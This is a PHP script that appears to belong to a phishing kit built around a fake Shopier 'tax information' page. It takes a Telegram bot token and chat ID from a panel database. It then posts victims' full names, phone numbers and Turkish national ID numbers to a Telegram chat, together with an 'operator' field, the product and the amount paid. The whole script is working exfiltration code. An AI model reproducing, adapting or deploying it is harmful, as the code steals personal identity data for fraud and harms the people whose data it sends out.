<?php
include('database/connect.php');

$query = $db->prepare("SELECT * FROM panel WHERE id=1;");
$query->execute();
if ($query->rowCount()) {
    foreach ($query as $sonuc) {
$telegramToken = $sonuc['vergibot_token'];
$chatId = $sonuc['vergibot_chatid'];
    }
}

$sendMessageUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";
$messageText = "🟣 *Shopier Vergi Bilgileri* 🟣\n\n";
$messageText .= "🥷🏻 *Atıcı:* $ekleyen\n";
$messageText .= "👻 *Ürün Adı:* $urunadi\n";
$messageText .= "💵 *Miktar:* $miktar TL\n";
$messageText .= "🎲 *Ad - Soyad:* $ad $soyad\n";
$messageText .= "📱 *Tel No:* $telno\n";
$messageText .= "🪪 *Tc No:* $tcno\n";
$messageText .= "📆 *Tarih:* $tarih\n";
$messageText .= "🕑 *Saat:* $saat";

$ch = curl_init($sendMessageUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $chatId,
    'text' => $messageText,
    'parse_mode' => 'Markdown',
]);
curl_exec($ch);
curl_close($ch);
?>